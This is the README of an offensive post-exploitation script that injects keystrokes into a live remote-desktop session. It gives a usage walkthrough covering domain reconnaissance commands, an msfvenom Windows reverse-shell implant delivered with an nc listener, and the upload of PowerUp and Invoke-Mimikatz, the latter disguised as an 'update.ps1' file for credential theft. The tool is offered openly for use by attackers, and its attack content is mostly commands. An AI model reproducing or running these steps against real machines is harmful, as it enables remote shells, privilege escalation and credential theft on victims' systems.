# Description

## Introduction

A script to automate keystrokes through an active remote desktop session that assists offensive operators in combination with living off the land techniques.

## About RKS (RemoteKeyStrokes)

All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop.

## Help Menu

```
$ ./rks.sh -h
Usage: ./rks.sh [-c <command | cmdfile> | -i <input_file> -o <output_file> -p <platform>] [-m <method>] [-w <windowname>] [-h]
Options:
    -c, --command <command | cmdfile>       Specify a command or a file containing to execute
    -i, --input <input_file>                Specify the local input file to transfer
    -o, --output <output_file>              Specify the remote output file to transfer
    -m, --method <method>                   Specify the file transfer or execution method
                                            (For file transfer "base64" is set by default if
                                            not specified. For execution method "none" is set
                                            by default if not specified)

    -p, --platform <operating_system>       Specify the operating system (windows is set by
                                            default if not specified)

    -w, --windowname <name>                     Specify the window name for graphical remote
                                            program (freerdp is set by default if not
                                            specified)

    -h, --help                              Display this help message
```

## Usage

### Internal Reconnaissance

- When running in command prompt

```
$ cat recon_cmds.txt
whoami /all
net user
net localgroup Administrators
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain

$ ./rks.h -c recon_cmds.txt
```

### Execute Implant

- Execute an implant while reading the contents of the payload in powershell.

```
$ msfvenom -p windowx/x64/shell_reverse_tcp lhost=<IP> lport=4444 -f psh -o implant.ps1

$ ./rks.sh -c implant.ps1

$ nc -lvnp 4444
```

### File Transfer

- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes.

```
$ ./rks.sh -i /usr/share/powersploit/Privesc/PowerUp.ps1 -o script.ps1

$ ./rks.sh -i /usr/share/powersploit/Exfiltration/Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m base64
```

### Specify Grapical Remote Software

- If you're targeting VNC network protocols you can specify the window name with `tightvnc`.

`$ ./rks.sh -i implant.ps1 -w tightvnc`

- If you're targeting legacy operating systems with older RDP authentication specify the window name with `rdesktop`.

`$ ./rks.sh -i implant.bat -w rdesktop`

## TODO and Help Wanted

- Implement Base64 file transfer

- Implement Bin2Hex file transfer

- Implement to read shellcode input and run C# implant and powershell runspace

## References

- [Video: sethc.exe Backdoor CMD Payload delivery (USB Rubber Ducky style)](https://www.youtube.com/watch?v=8YFEujJUxws)

- [Original Script](https://github.com/nopernik/mytools/blob/master/rdp-cmd-delivery.sh)

## Credits

- [nopernik](https://github.com/nopernik)
